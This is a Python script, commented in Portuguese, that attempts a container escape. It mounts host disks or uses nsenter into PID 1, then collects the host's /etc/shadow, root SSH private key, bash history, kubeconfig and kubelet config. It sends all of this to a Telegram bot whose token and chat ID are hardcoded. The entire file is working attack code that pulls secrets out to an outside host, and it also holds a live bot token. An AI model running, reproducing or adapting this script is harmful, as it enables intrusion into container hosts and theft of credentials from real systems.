#!/usr/bin/env python3
"""
Script definitivo de escape:
1. Monta /dev/vdb (ou outros) em /mnt
2. Extrai shadow, ssh keys, kubeconfig, etc.
3. Envia tudo via Telegram (arquivos e mensagens)
"""

import subprocess
import json
import requests
import os
import sys
import time
import glob
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A" or content.startswith("ERRO"):
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

def mount_host():
    """Tenta montar os dispositivos candidatos em /mnt."""
    devices = ['/dev/vdb', '/dev/vda', '/dev/vdc']  # ordem de prioridade
    os.makedirs("/mnt", exist_ok=True)
    for dev in devices:
        send_telegram(f"🔄 **Tentando montar {dev}...**")
        # Tenta com auto-detecção, depois ext4, xfs
        for fstype in ['', '-t ext4', '-t xfs']:
            cmd = f"mount {fstype} {dev} /mnt 2>/dev/null"
            if "ERRO" not in run(cmd):
                if os.path.exists("/mnt/etc/shadow") or os.path.exists("/mnt/root"):
                    send_telegram(f"✅ **{dev} montado com sucesso em /mnt**")
                    return True
                else:
                    # Montou mas não é o host
                    run("umount /mnt 2>/dev/null")
        # Se não conseguiu, desmonta por segurança
        run("umount /mnt 2>/dev/null")
    return False

def collect_host_data():
    """Coleta arquivos sensíveis do host a partir de /mnt."""
    data = {}
    targets = {
        "host_shadow": "/mnt/etc/shadow",
        "host_passwd": "/mnt/etc/passwd",
        "host_hostname": "/mnt/etc/hostname",
        "host_resolv": "/mnt/etc/resolv.conf",
        "host_ssh_private_key": "/mnt/root/.ssh/id_rsa",
        "host_bash_history": "/mnt/root/.bash_history",
        "host_kube_config": "/mnt/root/.kube/config",
        "host_kubelet_config": "/mnt/var/lib/kubelet/config",
        "host_proc_environ": "/mnt/proc/1/environ",
        "host_docker_sock": "/mnt/run/docker.sock",  # apenas para saber se existe
        "host_etc_hosts": "/mnt/etc/hosts"
    }
    for key, path in targets.items():
        try:
            if os.path.exists(path) and os.path.isfile(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(50000)  # até 50k caracteres
                data[key] = content
            else:
                data[key] = "N/A"
        except Exception as e:
            data[key] = f"ERRO: {e}"
    # Também tenta listar /root
    try:
        data["host_root_ls"] = run("ls -la /mnt/root/ 2>/dev/null")
    except:
        pass
    return data

def main():
    send_telegram("🚀 **Iniciando escape – montagem do host**")
    
    # 1. Montar o host
    if not mount_host():
        send_telegram("❌ **Falha na montagem direta. Tentando nsenter...**")
        # Fallback: nsenter com PID 1
        test = run("nsenter -t 1 -m cat /etc/hostname 2>/dev/null")
        if test and "ERRO" not in test:
            send_telegram(f"✅ **nsenter funcionou (hostname: {test})**")
            # Tentar montar via nsenter
            if "OK" in run("nsenter -t 1 -m mount --bind / /mnt 2>/dev/null && echo OK"):
                send_telegram("✅ **Host montado via nsenter**")
            else:
                # Coletar arquivos via nsenter diretamente
                data = {}
                for f in ['/etc/shadow', '/root/.ssh/id_rsa', '/var/lib/kubelet/config']:
                    content = run(f"nsenter -t 1 -m cat {f} 2>/dev/null")
                    if content and "ERRO" not in content:
                        data[f.replace('/', '_')] = content
                if data:
                    send_data(data)
                    send_telegram("✅ **Dados coletados via nsenter**")
                else:
                    send_telegram("❌ **nsenter não trouxe dados.**")
                return
        else:
            send_telegram("❌ **nsenter também falhou.**")
            return

    # 2. Coletar dados do host montado
    send_telegram("📁 **Coletando dados do host...**")
    host_data = collect_host_data()
    send_data(host_data)

    # 3. Enviar JSON completo
    json_file = f"host_escape_{int(datetime.now().timestamp())}.json"
    with open(json_file, "w") as f:
        json.dump(host_data, f, indent=2)
    send_file(json_file, caption="📁 Dados completos do host (JSON)")
    os.remove(json_file)

    send_telegram("✅ **Escape finalizado com sucesso!**")

if __name__ == "__main__":
    main()
